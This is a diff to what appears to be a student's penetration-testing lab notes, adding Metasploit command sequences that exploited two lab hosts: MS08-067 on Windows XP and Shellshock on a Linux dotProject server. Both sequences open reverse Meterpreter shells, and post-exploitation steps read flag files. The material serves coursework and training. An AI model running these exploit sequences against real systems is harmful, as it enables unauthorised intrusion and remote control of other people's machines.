@@ -60,9 +60,83 @@ If you forgot how to open the lab environment:
 
 | Exploited? | IP | Ports | Network mapping scan | Vulnerability scan |
 |------------|-----|-------|----------------------|--------------------|
-| | `10.20.160.102` | | | |
+| Exploited | `10.20.160.102` | 80; 443; 8080 | Complete | Complete |
 | | `10.20.160.101` | 135; 139; 445; 49152; 49153; 49154; 49155; 49217; 49222 | | |
 | Exploited | `10.20.160.100` | 139; 445 | Complete | Complete |
+
+---
+
+## Replicable exploit paths (your wins)
+
+### `10.20.160.100` (Windows XP) — SMB `ms08_067_netapi`
+
+**Primary vulnerability / attack path**
+- XP-era SMB stack vulnerability aligned with **MS08-067**; null SMB enum was unreliable, but exploit path still landed.
+
+**Replicable command flow**
+```text
+msfconsole -q
+use exploit/windows/smb/ms08_067_netapi
+set RHOSTS 10.20.160.100
+set LHOST <KALI_LAB_IP>
+set LPORT 4444
+set PAYLOAD windows/meterpreter/reverse_tcp
+check
+run
+```
+
+**Post-ex / proof capture**
+```text
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > search -f proof.txt
+meterpreter > shell
+C:\> type "c:\Documents and Settings\Barbara\Desktop\proof.txt"
+```
+
+**Evidence / proof screenshots**
+- Exploit session opened: [`100-003`](work/10.20.160.100/Screenshots/100-003_msf_ms08_067_netapi_meterpreter_session_tm6_afrocha.png)
+- Host + SYSTEM context: [`100-004`](work/10.20.160.100/Screenshots/100-004_meterpreter_sysinfo_system_shell_echo_tm6_afrocha.png)
+- Proof path found (`proof.txt`): [`100-005`](work/10.20.160.100/Screenshots/100-005_meterpreter_search_proof_txt_barbara_desktop_tm6_afrocha.png)
+- `proof.txt` read in shell: [`100-006`](work/10.20.160.100/Screenshots/100-006_meterpreter_type_unknown_shell_cmd_proof_tm6_afrocha.png)
+- End-to-end capture: [`100-008`](work/10.20.160.100/Screenshots/100-008_ms08_067_session4_sysinfo_shell_proof_txt_tm6_afrocha.png)
+
+### `10.20.160.102` (Linux / dotProject) — Shellshock + Meterpreter
+
+**Primary vulnerabilities / best attack path**
+- Web stack exposed **Shellshock-compatible CGI** lane (working `TARGETURI` path on this host).
+- DotProject **RFI** path also validated and useful for report narrative.
+
+**Replicable command flow (Shellshock win)**
+```text
+msfconsole -q
+search type:exploit platform:linux cgi_bash
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOSTS 10.20.160.102
+set RPORT 80
+set TARGETURI /cgi-bin/test-cgi
+set LHOST <KALI_LAB_IP>
+set LPORT 4444
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+run
+```
+
+**Post-ex / local flag capture**
+```text
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > shell
+$ cd ~
+$ cd Desktop
+$ cat local.txt
+```
+
+**Evidence / local flag screenshots**
+- Exploit config + run (`targeturi /cgi-bin/test-cgi`): [`102-011`](work/10.20.160.102/Screenshots/102-011_msf_search_apache_mod_cgi_bash_env_set_targeturi_test_cgi_run_tm6_afrocha.png)
+- Meterpreter session + `sysinfo/getuid`: [`102-012`](work/10.20.160.102/Screenshots/102-012_msf_shellshock_meterpreter_session5_sysinfo_getuid_shell_afrocha_tm6_afrocha.png)
+- Earlier successful session capture: [`102-009`](work/10.20.160.102/Screenshots/102-009_msf_shellshock_apache_mod_cgi_meterpreter_sysinfo_shell_elara_tm6_afrocha.png)
+- `local.txt` read from `~/Desktop`: [`102-010`](work/10.20.160.102/Screenshots/102-010_shell_meterpreter_home_desktop_cat_local_txt_afrocha_tm6_afrocha.png)
+- RFI proof for supporting narrative: [`102-004`](work/10.20.160.102/Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png)
 
 ---
 
